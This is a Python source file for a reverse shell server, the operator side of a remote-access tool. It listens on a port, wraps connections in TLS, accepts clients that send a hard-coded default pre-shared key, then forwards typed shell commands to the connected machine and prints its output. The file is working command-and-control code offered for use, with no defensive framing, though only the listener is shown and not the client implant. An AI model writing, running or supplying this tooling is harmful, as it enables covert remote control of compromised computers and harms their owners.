#!/usr/bin/env python3
"""
Reverse Shell Server
--------------------
This server listens for incoming client connections,
and allows the user to forward commands to them.
"""
import socket
import ssl
import sys
import argparse

# Change here the default values
parser = argparse.ArgumentParser()
parser.add_argument('--port', type=int,
                    help='Port to connect to', default=9999)
parser.add_argument('--password', type=str,
                    help='Pre-shared key', default="123456789")
parser.add_argument('--private-key-path', type=str,
                    help='Server\'s key path', default="key.pem")
parser.add_argument('--public-key-path', type=str,
                    help='Server\'s certificate path', default="cert.pem")
args = parser.parse_args()


class SocketServer:
    """
    A simple socket server that binds to a specified host and port,
    accepts one connection, and sends commands to the connected client.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = args.port) -> None:
        """
        Set up the server with a host and port. Set up the TLS context.
        """
        self.host = host
        self.port = port
        self.socket = None

        self.tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.tls_context.load_cert_chain(
            certfile=args.public_key_path,
            keyfile=args.private_key_path
        )

    def __enter__(self):
        """
        Create the socket and bind it to the host and port
        when entering the context manager.
        """
        try:
            self.create_socket()
            self.bind_socket()
        except Exception as error:
            print(f"Socket creation or binding error: {error}")
            sys.exit(1)
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        """
        Close the socket when exiting the context manager.
        """
        if self.socket:
            self.socket.close()

    def create_socket(self) -> None:
        """
        Create the socket for the server.
        """
        print("Creating socket...")
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket created successfully.")

    def bind_socket(self) -> None:
        """
        Bind the socket to the host and port, and start listening for connections.
        """
        print(f"Binding to port {self.port}...")
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print("Socket bound successfully.")

    def accept_connection(self) -> None:
        """
        Accept an incoming connection and handle communication.
        """
        while True:
            try:
                self.socket.settimeout(1)
                client, address = self.socket.accept()
                break
            except socket.timeout:
                pass

        print(f"Connection with {address[0]}:{address[1]} established.")

        try:
            # Wrap the socket with TLS
            with self.tls_context.wrap_socket(client, server_side=True) as client:
                print("TLS Handshake completed.")

                # Authenticate the client using a pre-shared key (PSK)
                print("Waiting for PSK from client...")
                if not self.client_authenticated(client):
                    print("Invalid PSK. Client could not be authenticated.")
                    return
                print("Valid PSK received. Client authenticated.")

                self.send_commands(client)
        finally:
            print(f"\nConnection with {address[0]}:{address[1]} closed.")
            self.socket.settimeout(None)

    def send_commands(self, conn: ssl.SSLSocket):
        """
        Send commands to the connected client
        until the session is closed by any side.
        Type 'quit' or 'exit' to end the current session.
        """
        print("You can now send commands to the client.")
        print("Type 'quit' or 'exit' to end the current session.")
        while True:
            try:
                command = None
                while not command:
                    command = input("Enter command: ")

                if command.lower() in ["quit", "exit"]:
                    break

                # Send the command to the client, receive the response and display it
                conn.send(command.encode())
                client_response = conn.recv(1024).decode('utf-8')
                if not client_response:
                    print("Client disconnected.")
                    break
                print(client_response, end="")
            except socket.timeout:
                pass

    def client_authenticated(self, conn: ssl.SSLSocket):
        """
        Check if the client provided the correct pre-shared key (PSK).
        """
        psk = conn.recv(1024).decode()
        return psk == args.password


def main():
    with SocketServer() as server:
        print("Server started.")
        print("You can stop the server whenever with Ctrl+C or Ctrl+D.")
        while True:
            print("Waiting for incoming connections...")
            try:
                server.accept_connection()
            # Handle Ctrl+C, Ctrl+D
            except KeyboardInterrupt:
                print("Exiting.")
                break
            except:
                pass


if __name__ == "__main__":
    main()
